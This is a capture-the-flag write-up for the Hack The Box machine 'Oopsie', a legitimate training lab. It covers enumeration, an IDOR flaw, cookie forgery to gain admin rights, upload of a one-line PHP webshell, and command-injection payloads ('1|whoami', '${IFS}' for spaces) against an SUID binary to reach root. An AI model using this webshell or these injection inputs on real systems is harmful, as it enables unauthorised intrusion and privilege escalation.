HTB - Oopsie

Operating System: Linux
Tags: Apache, PHP, Enumeration, IDOR, SUID

Information Gathering

First I started with a basic Nmap scan to identify open ports and services. This scan revealed that the only services running were SSH on port 22 and Apache on port 80.

$ nmap -sV -sC 10.129.204.23

Vulnerability Assessment

I started by visiting the apache webpage and found the home page had no functionality. Next I used gobuster to check for any hidden directories. Gobuster revealed the /cdn-cgi path, but gave a 403 error upon visiting it. Using gobuster again, I checked further into cdn-cgi to find a /login endpoint.

$ gobuster dir -u http://10.129.204.23 -w Wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
$ gobuster dir -u http://10.129.204.23/cdn-cgi -w Wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt

The page seemed normal except for the option to log in as a guest user.

http://10.129.204.23/cdn-cgi/login

Exploitation

As a guest, the two pages that stuck out for me were account and uploads. I visited the account page and noticed a GET request using an id parameter. Changing this parameter displays the name, email, and access ID for a specific user. I changed the ID equal to 1 and found the admin's information.

http://10.129.204.23/cdn-cgi/login/admin.php?content=accounts&id=1

Prior to this finding, the uploads page required admin rights. When I used Burp Suite to analyze the request, I noticed two cookie values that defined me as a guest user.

I changed both cookie values to match the admin user and was able to view the upload page fully.

Cookie: user=34322; role=admin

With the ability to upload files, I uploaded a webshell and found it in the /uploads directory discovered earlier with Gobuster. This gave me RCE on the host machine and I found the user flag in robert's directory.

<?php system($_REQUEST['cmd']); ?>
http://10.129.204.23/uploads/shell.php?cat /home/robert/user.txt

Post-Exploitation

I realized that more work would need to be done on the host machine to get the root flag, so I replaced my payload with a reverse shell from pentestmonkey and connected with netcat. Now it would be easier to run commands and enumerate the machine.

Once I found the user flag, I looked through the source code of the application for any way to escalate privileges. In the db.php file, I discovered Robert's password and logged into his account. During this time I kept losing my shell connection to the machine, so with my new credentials I logged in through SSH on port 22.


First I tried sudo -l to view what commands I could run with root privileges, but Robert could not run sudo at all. When I used id, I found that Robert was a part of the bugtracker group.

To view all the files related to the bugtracker group I ran find / -group bugtracker 2>/dev/null. This revealed one file located in the /usr/bin directory which had root privileges.

$ ls -la /usr/bin/bugtracker

Despite being an executable, I tried to view its contents and discovered it was running the command cat /root/reports.

I ran ./bugtracker as intended and it provided a normal bug report. The program seems to directly run the shell command cat, so I added a pipe followed by whoami to inject more commands. This was successful and displayed root as the output.

Provide Bug ID: 1|whoami

With command injection, I viewed the root directory and found the final flag. The input field had a hard time with spaces, so I used ${IFS}, a bash shell variable that acts as a space.

Provide Bug ID: 1|cat${IFS}/root/root.txt
